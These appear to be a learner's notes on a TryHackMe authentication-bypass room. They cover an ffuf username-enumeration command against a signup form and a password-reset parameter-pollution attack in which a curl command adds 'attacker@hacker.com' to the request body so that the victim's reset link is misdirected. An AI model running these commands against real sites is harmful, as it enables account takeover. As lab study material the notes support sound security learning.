Authentication is the process by which a web application verifies the identity of the user making a requests.When the credentials match, the server issues a session token that is returned on every subsequent requests until the session expires. When the user put in the login credentials and click the login button, it basically goes thorough the application layer on the web and lookup the credentials database . with new session created by the application server, it locates the session id with the credentials .
Types of Authentication Bypass:
1.Username Enumeration
2.Credentials Brute force
3.Logic Flaws
4.Cookie Manipulation

Credentials Reuse can be done from the data that once has been bypass for unrelated application.
also known as the credentials stuffing . 


1.Username Enumeration :
Error Message Differentials
so, here we enumerate the username using the ffuf(Fuzz Faster U Fool) command .
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
     -X POST \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://MACHINE_IP/customers/signup \
     -mr "(?i)username already exists"

EXAMPLE USAGE:
  Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42.
  Colored, verbose output.
    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v

  Fuzz Host-header, match HTTP 200 responses.
    ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200

  Fuzz POST JSON data. Match all responses not containing text "error".
    ffuf -w entries.txt -u https://example.org/ -X POST -H "Content-Type: application/json" \
      -d '{"name": "FUZZ", "anotherkey": "anothervalue"}' -fr "error"

  Fuzz multiple locations. Match only responses reflecting the value of "VAL" keyword. Colored.
    ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr "VAL" -c

Here we used the ffuf for Username enumeration. after we know the username we can try bruteforce the password with the username(got from earlier). 

2.Credentials Brute Force

3.Logic Flaws

Parameter Pollution in password reset:
Parameter Pollution  = sending the same parameter name more than once, in different locations (or even the same location), so that different parts of the server's code end up reading different values for what they _assume_ is a single, consistent piece of data. 

The "pollution" is that you're deliberately injecting a **second, conflicting value** for a parameter the developer expected to only ever have one source of truth.


%40 and others are known as the percent URL encoded syntax.
The sequence %40 is the URL-encoded form of @, just like %26 is of &, %23 is of #(truncate) and
%3D is for = .
In the example of the TRYHACKME room called the Broken Authentication, we got to see the Parameter Pollution in Password Reset as:

	```bash
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```


1)As for the Password reset it required Email and then username. Here, robert@acmesupport.thm and robert. which it is  right then reset email is sent to the robert@acmesupport.thm .On which surface It seems well-defended workflow BUT the implementation splits those two values across different parts of the HTTP request. The email address is carried in the URL query string, and the username is carried in the POST body.


```bash
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```


so this is the curl command that send both values of the email and username for the reset page.The catch is simply the $\_REQUEST  super global . On the server side, the application identifies the target account from the query string parameter email, but it composes the outbound reset message using the PHP's $\_REQUEST superglobal i.e it merges 3 different sources of input into a single array .

```bash
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

where, 
-H argument sets the Content-Type header so the server treats the body as URL-encoded form data,
-d argument supplies the body

	so Basically what happens here is that when this curl command is executed first (URL query string ) the GET  request and then the POST for username and attacker email, which means the reset password link is sent to the attacker email that is valid for robert's pass reset.